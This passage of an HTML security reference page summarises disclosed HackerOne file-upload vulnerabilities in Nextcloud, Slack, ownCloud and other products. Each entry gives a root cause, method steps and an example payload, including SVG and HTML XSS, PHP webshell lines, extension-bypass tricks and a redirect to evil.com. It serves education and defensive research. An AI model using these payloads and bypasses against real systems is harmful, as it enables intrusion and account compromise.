+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An avatar/contact image uploader that blocks .svg is bypassed by uploading an SVG named .png; Chrome content-sniffs the actual SVG markup and renders/executes it when the image is opened directly in a tab (CVE-2020-8280).</p>
+<h4>Method</h4><ol><li>Take an SVG containing a script/redirect payload</li><li>Rename it to bypass the extension check (redirectxss.svg.png)</li><li>Upload as contact/avatar image</li><li>In Chrome, open the image in a new tab -&gt; SVG script executes</li></ol>
+<div class="pre">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;   (saved as file.svg.png)</div>
+<p class="insight"><b>Insight —</b> Extension/Content-Type checks are insufficient against SVG XSS because browsers sniff content. Retry blocked SVG uploads with .png/.jpg extensions; direct-open (Open image in new tab) forces render. Works in Chrome/Chromium, not Firefox in this case.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/998422" target="_blank" rel="noopener">hackerone.com/reports/998422</a></span><a class="src" href="#report-998422" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1781751" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Attacker-controlled upload filename via mutable 'key' param + path disclosure</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1781751</b> · nextcloud · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>Attacker-controlled filename + disclosed absolute path -&gt;</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The theming logo/favicon upload uses a client-supplied 'key' value as the stored filename, so intercepting and modifying it lets the attacker control the written filename/path; an error additionally discloses the server path.</p>
+<h4>Method</h4><ol><li>Go to /settings/admin/theming and upload a logo or favicon</li><li>Intercept the request in Burp</li><li>Modify the 'key' parameter to control the resulting filename/location on disk; trigger the error that reveals the absolute path</li></ol>
+<div class="pre">POST /settings/admin/theming/ ...
+# modify the 'key' field (used as filename) to an attacker-chosen value</div>
+<p class="insight"><b>Insight —</b> When an upload endpoint takes a separate name/key/path parameter, fuzz it independently of the file content: server-side use of the client value as a filename yields arbitrary-filename writes and, combined with verbose errors, path disclosure that seeds later traversal/overwrite attacks.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1781751" target="_blank" rel="noopener">hackerone.com/reports/1781751</a></span><a class="src" href="#report-1781751" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-201529" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pre-authentication file upload on the login endpoint</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#201529</b> · ui · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ui</b></span><span>Surface <b>web</b></span><span>Chain <b>pre-auth upload (fill tmp/upload) -&gt; DoS; + LFI/path trav</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The AirFibre login.cgi endpoint processes multipart file uploads and writes them to tmp/upload before performing authentication, so an unauthenticated attacker can drop arbitrary files (DoS via disk exhaustion; potential RCE if chained with LFI or a writable web root).</p>
+<h4>Method</h4><ol><li>POST a multipart/form-data body with a file part to the unauthenticated login endpoint.</li><li>Observe the file is written to tmp/upload with no session/auth required.</li><li>Repeat to exhaust disk (DoS); chain with an LFI/path-traversal to reach code execution.</li></ol>
+<div class="pre">POST http://TARGET/login.cgi HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
+
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc
+Content-Disposition: form-data; name="file"; filename="test6.txt"
+Content-Type: text/plain
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc--</div>
+<p class="insight"><b>Insight —</b> On embedded/IoT and appliance web UIs, test the login/CGI endpoints for file-handling BEFORE authenticating. Handlers that parse multipart bodies early can persist attacker files pre-auth; even without directory control it is a disk-fill DoS and an LFI chain seed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/201529" target="_blank" rel="noopener">hackerone.com/reports/201529</a></span><a class="src" href="#report-201529" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-158148" style="--sv:var(--sev-none)" data-sev="0" data-votes="50" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Webshell surviving image resize -&gt; RCE</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#158148</b> · x · awarded · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Content-sniff/encoding tripped triage; use Burp to see raw r</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An image upload endpoint preserved the client extension and resized images to 50x50 at a fixed JPEG quality; by crafting a JPEG that keeps a PHP webshell after that exact resize/recompression and uploading it as .php, the reporter achieved RCE.</p>
+<h4>Method</h4><ol><li>Find fileUpload.php; note it preserves extension and resizes to 50x50</li><li>Read the post-resize quality from the returned image metadata (here 75%)</li><li>Generate a 50x50 75%-quality JPEG with an embedded PHP shell that survives recompression</li><li>Upload with .php extension; request the stored file with ?c=id</li></ol>
+<div class="pre">POST /api/actions/fileUpload.php  (multipart, filename="shell.php")
+&lt;crafted 50x50 75% JPEG carrying &lt;?php system($_GET['c']); ?&gt;&gt;
+# then: GET /view/data/logos/shell_&lt;id&gt;.php?c=id</div>
+<p class="insight"><b>Insight —</b> Image processing is not a safe filter: if the extension is attacker-controlled, craft a polyglot that survives the exact resize/quality pipeline (match the server's output quality, read from returned metadata). Reference: virtualabs bulletproof JPEGs.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/158148" target="_blank" rel="noopener">hackerone.com/reports/158148</a></span><a class="src" href="#report-158148" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-97672" style="--sv:var(--sev-none)" data-sev="0" data-votes="24" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via image upload accepting HTML (served as text/html on CDN)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#97672</b> · x · awarded · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app-icon image upload does not validate real file type; an HTML file uploaded with a .jpg name (then swapped to .html and Content-Type text/html) is stored and served inline from images.mopub.com, executing as HTML.</p>
+<h4>Method</h4><ol><li>Select an HTML file but give it a .jpg extension to pass the picker</li><li>Intercept the upload and change filename to .html and Content-Type to text/html</li><li>Open the stored file URL; it renders as HTML and the script executes</li></ol>
+<div class="pre">POST /inventory/app_icon/upload/
+Content-Disposition: form-data; name="image_upload"; filename="xssfileuploadcopy.html"
+Content-Type: text/html
+
+&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</div>
+<p class="insight"><b>Insight —</b> Image-upload endpoints that trust client extension/Content-Type and serve files inline from a CDN origin allow stored XSS; upload HTML, flip the extension/MIME in the request, then open the file URL directly.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/97672" target="_blank" rel="noopener">hackerone.com/reports/97672</a></span><a class="src" href="#report-97672" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1720822" style="--sv:var(--sev-none)" data-sev="0" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unicode-whitespace extension smuggling bypasses upload deny-list (CVE-2021-32708)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#1720822</b> · nextcloud · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>deny-list bypass -&gt; PHP file in executable dir -&gt; RCE</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Flysystem 1.x/2.x normalized paths by silently stripping unicode whitespace; a filename whose extension contains a unicode whitespace char passes an extension deny-list check, then the whitespace is removed, leaving an executable extension on disk.</p>
+<h4>Method</h4><ol><li>When an app validates uploaded filenames against a deny-list (blocks .php etc.) rather than an allow-list, insert a unicode whitespace char inside the extension.</li><li>Deny-list sees a non-.php extension and accepts; the storage layer strips the whitespace and writes shell.php.</li><li>If the upload dir executes PHP, request the file for RCE.</li></ol>
+<div class="pre"># conceptual: extension with U+00A0/U+200B/U+2028 etc.
+shell.ph\u00A0p   -&gt; stored as shell.php after whitespace normalization</div>
+<p class="insight"><b>Insight —</b> Deny-list extension filters are defeated by any normalization step that runs after the check. Probe with unicode whitespace and other chars the storage layer normalizes; always prefer allow-lists.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1720822" target="_blank" rel="noopener">hackerone.com/reports/1720822</a></span><a class="src" href="#report-1720822" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-148853" style="--sv:var(--sev-none)" data-sev="0" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via SVG upload served as image/svg+xml</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#148853</b> · paragonie · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>paragonie</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Uploaded SVG files are stored and served with Content-Type image/svg+xml on the app's own origin. Browsers execute script embedded in an SVG rendered as a document, yielding stored XSS.</p>
+<h4>Method</h4><ol><li>Craft an SVG containing a &lt;script&gt; element</li><li>Upload it via any image upload that preserves image content-types</li><li>Get a victim to open the file URL directly on the app origin</li></ol>
+<div class="pre">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> SVG is an XSS vector whenever user uploads are served inline from the app origin. Mitigation and detection: check whether SVGs are forced to text/plain or served from a sandbox domain; if not, it's stored XSS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/148853" target="_blank" rel="noopener">hackerone.com/reports/148853</a></span><a class="src" href="#report-148853" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-151231" style="--sv:var(--sev-none)" data-sev="0" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Content-type sniffing stored XSS (IE) via ZIP-header polyglot</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#151231</b> · paragonie · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>paragonie</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When responses lack X-Content-Type-Options: nosniff, Internet Explorer MIME-sniffs uploaded files and can execute an HTML payload embedded after a benign (ZIP) header, giving stored XSS regardless of the declared Content-Type.</p>
+<h4>Method</h4><ol><li>Build a file with a ZIP header followed by an HTML/JS payload</li><li>Upload as an authenticated user, controlling the served filename</li><li>Send an IE victim the file URL; IE sniffs and renders it as HTML</li></ol>
+<div class="pre">[ZIP magic bytes]&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</div>
+<p class="insight"><b>Insight —</b> Absence of nosniff/X-Download-Options on user-uploaded file responses is exploitable (historically IE). Serve uploads from a sandbox origin, force download, and send nosniff. Detection: check headers on any file-download endpoint.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/151231" target="_blank" rel="noopener">hackerone.com/reports/151231</a></span><a class="src" href="#report-151231" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-140447" style="--sv:var(--sev-none)" data-sev="0" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Content-sniffing upload bypass + slack open-redirect to serve attacker HTML/phishing</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#140447</b> · slack · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload (content sniffing) -&gt; trusted-domain open red</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>open-redirect</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Upload sanitization checked the leading bytes/declared type but the server later served the file so browsers content-sniffed prepended binary garbage + HTML as text/html; a same-origin file link (checkcookie?redir / files-pri path) then acted as an open redirect to render it.</p>
+<h4>Method</h4><ol><li>Upload a file with Content-Type: text/html and filename pixel.png whose body is a chunk of binary bytes followed by an HTML/JS document</li><li>Generate the public file link (files.slack.com/files-pri/.../pixel?pub_secret=...)</li><li>Wrap it in the open redirect: https://slack.com/checkcookie?redir=&lt;file link&gt;  (or use slack.com/files-pri/... directly)</li><li>Victim clicking the trusted slack.com link lands on attacker-controlled HTML/JS (redirect, phishing login, malware)</li></ol>
+<div class="pre">POST /api/files.uploadAsync HTTP/1.1
+Host: upload.slack.com
+Content-Type: multipart/form-data; boundary=X
+
+--X
+Content-Disposition: form-data; name="file"; filename="pixel.png"
+Content-Type: text/html
+
+&lt;binary bytes here&gt;
+&lt;html&gt;&lt;script&gt;window.location='http://evil.com'&lt;/script&gt;&lt;/html&gt;
+--X--
+
+# then: https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/&lt;TEAM&gt;-&lt;FILE&gt;/pixel?pub_secret=&lt;secret&gt;</div>
+<p class="insight"><b>Insight —</b> When an upload filter only inspects the declared type or first bytes, prepend arbitrary binary padding before your HTML so the signature check passes but the browser still content-sniffs and renders HTML. Pair with any same-origin redirect endpoint to make the payload load from the trusted domain.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/140447" target="_blank" rel="noopener">hackerone.com/reports/140447</a></span><a class="src" href="#report-140447" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-84374" style="--sv:var(--sev-none)" data-sev="0" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Alternate PHP extension upload (.php5) -&gt; RCE</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#84374</b> · owncloud · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>owncloud</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An upload feature allows a server-executable extension (.php5) into a web-accessible directory, so the uploaded file runs as PHP when requested.</p>
+<h4>Method</h4><ol><li>Upload a file with an alternate PHP extension (php5/phtml/php7)</li><li>Locate it under the content path</li><li>Request it to execute the embedded PHP</li></ol>
+<div class="pre">171172-1.php5:
+&lt;?php phpinfo(); ?&gt;</div>
+<p class="insight"><b>Insight —</b> When .php is blocked, try alternate handler extensions: php3 php4 php5 php7 phtml pht phar; success depends on the AddHandler/mod_php config, not just the extension blacklist.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/84374" target="_blank" rel="noopener">hackerone.com/reports/84374</a></span><a class="src" href="#report-84374" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-161301" style="--sv:var(--sev-none)" data-sev="0" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG upload via renamed extension bypasses image filter</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#161301</b> · instacart · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>instacart</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The image-upload feature rejects .svg by extension but accepts an SVG file renamed to .png; the server stores and serves it as an image, so SVG content (potentially scriptable) is accepted despite the filter.</p>
+<h4>Method</h4><ol><li>Prepare an SVG file, rename it to file.png</li><li>Upload it to the list/recipe image field; the extension check passes</li><li>The SVG renders in the image area -&gt; filter bypassed</li></ol>
+<div class="pre"># save malicious.svg as file.png, upload
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> Extension-only filters are bypassed by renaming; always test SVG-&gt;.png/.jpg. If the file is later served with an image/svg+xml type or opened directly, SVG becomes stored XSS. Verify server-side content sniffing and the Content-Type it serves back.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/161301" target="_blank" rel="noopener">hackerone.com/reports/161301</a></span><a class="src" href="#report-161301" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-149268" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Remote-URL avatar fetch stores attacker-chosen extension (SVG XSS / arbitrary file)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#149268</b> · expressionengine · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>expressionengine</b></span><span>Surface <b>web</b></span><span>Chain <b>remote fetch -&gt; stored file in web root -&gt; SVG stored </b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A 'set avatar from external link' feature downloads whatever the URL returns and writes it into the public uploads folder preserving the source extension, with no content/type validation, yielding stored SVG XSS and arbitrary file placement.</p>
+<h4>Method</h4><ol><li>Set avatar via 'Link to avatar' to http://ATTACKER/test.svg containing a script</li><li>Server fetches it and saves /images/avatars/test_1.svg under web root</li><li>Open the stored SVG in a browser -&gt; script executes; other extensions (.zip, executable) also land on disk</li></ol>
+<div class="pre">Link to avatar: http://ATTACKER/test.svg
+&lt;!-- test.svg: &lt;svg xmlns=... onload=alert(document.domain)&gt; --&gt;</div>
+<p class="insight"><b>Insight —</b> URL-fetch avatar/import features are combined file-write + SSRF sinks: extension and content are attacker-controlled; test .svg (stored XSS) and executable extensions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/149268" target="_blank" rel="noopener">hackerone.com/reports/149268</a></span><a class="src" href="#report-149268" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-100565" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via uploaded SVG served as image/svg+xml</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#100565</b> · slack · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An SVG is uploaded and later served with Content-Type image/svg+xml and rendered inline; SVG supports onload handlers and &lt;script&gt;, so the browser executes embedded JS in the serving domain's origin.</p>
+<h4>Method</h4><ol><li>Craft an SVG with onload/inline &lt;script&gt;</li><li>Upload to a channel/DM or via public share link</li><li>Click the message/preview -&gt; browser navigates to the file domain and renders the SVG, executing JS</li></ol>
+<div class="pre">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;&lt;script type="text/javascript"&gt;&lt;![CDATA[ /* code */ ]]&gt;&lt;/script&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> Any upload feature that serves user files with image/svg+xml (or text/html) inline is XSS-prone even on a 'sandbox' file domain (usable for convincing phishing). Test SVG uploads; fixes are Content-Disposition: attachment, Content-Type text/plain, or CSP default-src 'none'.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/100565" target="_blank" rel="noopener">hackerone.com/reports/100565</a></span><a class="src" href="#report-100565" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-142940" style="--sv:var(--sev-none)" data-sev="0" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Upload extension filter bypass via POST/multipart tampering</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#142940</b> · drchrono · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>drchrono</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An upload restricted to .pdf enforced the check client-side / on the displayed extension; renaming a .php file to .pdf and tampering the raw multipart POST let the actual PHP content through and be stored.</p>
+<h4>Method</h4><ol><li>Attempt upload of a .php file (rejected as non-PDF).</li><li>Rename to .pdf; if still rejected, intercept and tamper the multipart POST (filename/Content-Type) so the server accepts it.</li><li>Confirm the raw file is stored at the returned URL.</li></ol>
+<div class="pre">Content-Disposition: form-data; name="file"; filename="shell.pdf"
+Content-Type: application/pdf
+
+&lt;?php system($_GET['c']); ?&gt;</div>
+<p class="insight"><b>Insight —</b> Never trust client-side/extension-only upload checks; intercept and forge filename + Content-Type in the multipart body. Impact hinges on where the file lands (execution only if served from an interpreter-enabled path, not a static CDN).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/142940" target="_blank" rel="noopener">hackerone.com/reports/142940</a></span><a class="src" href="#report-142940" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-155690" style="--sv:var(--sev-none)" data-sev="0" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via branding/logo image upload accepting HTML</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#155690</b> · nextcloud · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The logo / login-background upload does not validate that the file is really an image; an .html (or HTML disguised as an image) is stored under /data/ and served with an HTML content-type on the same origin.</p>
+<h4>Method</h4><ol><li>Upload an HTML file (or HTML-content 'image') via the theming logo/login-image upload</li><li>Browse to the stored path under /data/themedinstancelogo etc.</li><li>Browser renders it as HTML -&gt; same-origin script execution</li></ol>
+<div class="pre">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;  (uploaded as the logo file)</div>
+<p class="insight"><b>Insight —</b> Logo/avatar/branding upload fields are XSS sinks when the app serves the file inline from its own origin. Test with HTML and SVG payloads; note PHP was served as text here (no RCE) - the win is same-origin HTML/SVG execution.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/155690" target="_blank" rel="noopener">hackerone.com/reports/155690</a></span><a class="src" href="#report-155690" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (42 of 66 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">File upload labs</a> (hands-on practice).</li>
+<li>All 66 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#executable-extension-bypass-webshell" style="padding-left:24px">↳ Executable-extension bypass → webshell</a><a href="#path-name-field-arbitrary-write-no-upload-form" style="padding-left:24px">↳ Path/name-field arbitrary write (no upload form)</a><a href="#archive-content-package-extraction" style="padding-left:24px">↳ Archive / content-package extraction</a><a href="#media-library-sinks-imagemagick-exiftool" style="padding-left:24px">↳ Media-library sinks (ImageMagick / ExifTool)</a><a href="#svg-html-active-content-stored-xss" style="padding-left:24px">↳ SVG / HTML active content → stored XSS</a><a href="#same-origin-js-upload-csp-bypass" style="padding-left:24px">↳ Same-origin JS upload → CSP bypass</a><a href="#upload-by-verb-and-desktop-client-sinks" style="padding-left:24px">↳ Upload-by-verb and desktop-client sinks</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (66)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ PortSwigger: File upload</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
